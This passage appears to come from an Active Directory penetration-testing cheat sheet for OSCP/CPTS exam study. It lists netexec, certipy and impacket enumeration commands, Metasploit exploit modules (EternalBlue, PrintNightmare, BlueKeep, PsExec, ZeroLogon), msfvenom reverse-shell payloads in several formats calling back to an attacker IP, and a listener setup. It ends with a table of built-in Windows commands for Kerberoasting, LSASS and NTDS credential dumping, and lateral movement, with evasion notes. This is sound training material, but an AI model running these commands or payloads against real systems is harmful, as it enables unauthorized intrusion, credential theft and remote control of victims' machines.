netexec smb <SUBNET>/24 --gen-relay-list relay_targets.txt

# 3. LDAP signing
netexec ldap <DC_IP> -u '<USER>' -p '<PASSWORD>' -M ldap-checker

# 4. Password policy
netexec smb <DC_IP> -u '<USER>' -p '<PASSWORD>' --pass-pol

# 5. MachineAccountQuota
netexec ldap <DC_IP> -u '<USER>' -p '<PASSWORD>' -M maq

# 6. ADCS vulnerabilities
certipy-ad find -u '<USER>@<DOMAIN>' -p '<PASSWORD>' -dc-ip <DC_IP> -vulnerable -stdout

# 7. GPP passwords
netexec smb <DC_IP> -u '<USER>' -p '<PASSWORD>' -M gpp_password

# 8. LAPS
netexec ldap <DC_IP> -u '<USER>' -p '<PASSWORD>' --laps

# 9. GMSA
netexec ldap <DC_IP> -u '<USER>' -p '<PASSWORD>' --gmsa

# 10. Print Spooler on DC (for coercion)
impacket-rpcdump @<DC_IP> | grep -i 'MS-RPRN\|MS-EFSR'

# 11. Kerberoastable accounts
impacket-GetUserSPNs <DOMAIN>/<USER>:'<PASSWORD>' -dc-ip <DC_IP>

# 12. AS-REP Roastable accounts
impacket-GetNPUsers <DOMAIN>/<USER>:'<PASSWORD>' -dc-ip <DC_IP> -request
```

---

## Quick Reference: Metasploit Modules for AD/Windows

Common Metasploit modules for exam scenarios. OSCP limits Metasploit to one machine; CPTS has no such restriction.

> Full msfvenom reference and listener setup: [shells-and-payloads.md](shells-and-payloads.md) and [metasploit-framework.md](metasploit-framework.md).

```text
# Start Metasploit
msfconsole -q

# === EXPLOITATION ===
# EternalBlue (MS17-010) — SMB RCE
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <TARGET_IP>
set LHOST <ATTACKER_IP>
run

# PrintNightmare — Print Spooler RCE (requires creds)
use exploit/windows/dcerpc/cve_2021_1675_printnightmare
set RHOSTS <TARGET_IP>
set SMBUser <USER>
set SMBPass <PASSWORD>
run

# BlueKeep — RDP RCE
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS <TARGET_IP>
set TARGET 1    # Adjust for OS version
run

# PsExec — Pass-the-Hash execution
use exploit/windows/smb/psexec
set RHOSTS <TARGET_IP>
set SMBUser <USER>
set SMBPass <PASSWORD>    # Or set SMBPass with NTLM hash
run

# === SCANNERS / AUXILIARY ===
# ZeroLogon check
use auxiliary/admin/dcerpc/cve_2020_1472_zerologon
set RHOSTS <DC_IP>
set NBNAME <DC_HOSTNAME>
run

# SMB signing check
use auxiliary/scanner/smb/smb2
set RHOSTS <SUBNET>/24
run

# BlueKeep scanner
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
set RHOSTS <SUBNET>/24
run

# IPMI hash dump
use auxiliary/scanner/ipmi/ipmi_dumphashes
set RHOSTS <TARGET_IP>
run

# === PAYLOAD GENERATION (msfvenom) ===
# Windows reverse shell (exe)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f exe -o shell.exe

# Windows reverse shell (dll — for DLL hijacking / PrintNightmare)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f dll -o shell.dll

# Windows reverse shell (aspx — for IIS)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f aspx -o shell.aspx

# Windows reverse shell (msi — for AlwaysInstallElevated)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f msi -o shell.msi

# Windows reverse shell (hta — for mshta LOLBin)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f hta-psh -o shell.hta

# Java reverse shell (war — for Tomcat)
msfvenom -p java/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f war -o shell.war

# Linux reverse shell (elf)
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f elf -o shell.elf

# PHP reverse shell
msfvenom -p php/reverse_php LHOST=<ATTACKER_IP> LPORT=<PORT> -o shell.php

# === LISTENER ===
use exploit/multi/handler
set payload windows/x64/shell_reverse_tcp    # Match the payload used above
set LHOST <ATTACKER_IP>
set LPORT <PORT>
run
```

---

## LOTL Quick Reference

Pure-built-in alternatives for the most common AD primitives. All entries are present by default on Windows 7+ / Server 2008 R2+ unless flagged. RSAT entries (`Get-AD*`, `dsquery`, `setspn` on workstations) require the *AD DS and AD LDS Tools* feature.

| Task | Tool-based path | LOTL equivalent | OS / req. | OPSEC notes |
|---|---|---|---|---|
| User / computer / group enum | BloodHound, ldapsearch, PowerView | `[adsisearcher]` filters (Phase 2.4b) | Win7+ / .NET 3.5 | LDAP signing-safe; reads logged with auditing only |
| Trust enum | PowerView `Get-DomainTrust` | `nltest /domain_trusts /all_trusts /v` | Always present | Benign, no IOC |
| DC discovery | nmap, BloodHound | `nltest /dclist:<DOMAIN>`, `nltest /dsgetdc:<DOMAIN>` | Always present | Benign |
| SPN dump | `GetUserSPNs.py`, PowerView | `setspn -T <DOMAIN> -Q */*`, `[adsisearcher]` SPN filter | DC-default; workstation needs RSAT | Benign |
| Cred validation | netexec smb / kerbrute | `runas /netonly` + `klist tickets`, `cmdkey` + `net use` | Always present | Generates 4624/4625 like any auth |
| Lockout-aware spray | netexec, kerbrute | `[adsisearcher]` policy read + LDAP-bind loop (Phase 1.5) | Win7+ | Same 4625 footprint as netexec |
| Kerberoast | Rubeus, GetUserSPNs.py | `Add-Type System.IdentityModel` + `KerberosRequestorSecurityToken` (Phase 3.1) | Win7+ / .NET 3.5 | AES > RC4 for OPSEC; flagged as `Behavior:Win32/Kerberoast.A!ml` on bursts |
| AS-REP candidate discovery | GetNPUsers.py | `[adsisearcher]` UAC `:1.2.840.113556.1.4.803:=4194304` | Win7+ | Read-only, benign |
| Unconstrained delegation | PowerView `-Unconstrained` | `[adsisearcher]` UAC `:1.2.840.113556.1.4.803:=524288` | Win7+ | Read-only, benign |
| Constrained delegation | PowerView | `[adsisearcher]` `(msDS-AllowedToDelegateTo=*)` | Win7+ | Read-only, benign |
| RBCD write | impacket-rbcd, Powermad | `Set-ADComputer -PrincipalsAllowedToDelegateToAccount` (Phase 5.3) | RSAT | Audit on `msDS-AllowedToActOnBehalfOfOtherIdentity` write |
| ACL inspection | SharpHound, PowerView `Find-InterestingDomainAcl` | `Get-Acl "AD:$dn"` (Phase 4.1.x) | RSAT for `AD:` provider; `[DirectoryEntry].ObjectSecurity` without RSAT | Read-only |
| ADCS enum | Certipy `find` | `certutil -template -v`, `certutil -CAInfo`, `certutil -config - -dsCAList` (Phase 6.1) | Always present | Benign \u2014 sysadmin-routine |
| ADCS request | Certipy `req` | `certreq -submit -config "<CA>" req.inf cert.cer` (Phase 6.1) | Always present | IOC is the cert auth (4768 anomalous UPN), not the request |
| GMSA password | gMSADumper, netexec `--gmsa` | `Get-ADServiceAccount -Properties msDS-ManagedPassword` (Phase 8.1) | RSAT | Confidential attribute \u2014 4662 with attribute GUID |
| LAPS read | netexec `--laps` | `Get-ADComputer -Properties msLAPS-Password,ms-Mcs-AdmPwd` / `Get-LapsADPassword` (Phase 8.2) | RSAT (LAPS module for v2 decrypt) | Confidential attribute \u2014 4662 |
| LSASS dump | mimikatz, nanodump | `rundll32 comsvcs.dll, MiniDump <PID> out.dmp full` (windows-methodology) | Win7+ admin + SeDebug | Heavily flagged 2026 \u2014 see `windows-methodology.md` |
| Local hash dump | secretsdump | `reg save HKLM\SAM/SYSTEM/SECURITY` (Phase 10.2) | Local admin | High-fidelity Sigma rule on `reg.exe + HKLM\SAM + save` |
| NTDS extraction | secretsdump (DCSync) | `ntdsutil ifm` / `esentutl /y /vss` / `vssadmin` (Phase 10.2) | DC + DA / SeBackup | See per-method detection table in 10.2 |
| Ticket cache | Rubeus | `klist`, `klist tgt`, `klist purge`, `klist sessions` | Vista+ | Benign (read); admin needed for `-li` other sessions |
| Lateral exec | evil-winrm, psexec | `winrs`, `Enter-PSSession`, `Invoke-Command` | Server-default; workstation needs `Enable-PSRemoting` | 4624 type 3 + WinRM operational log |
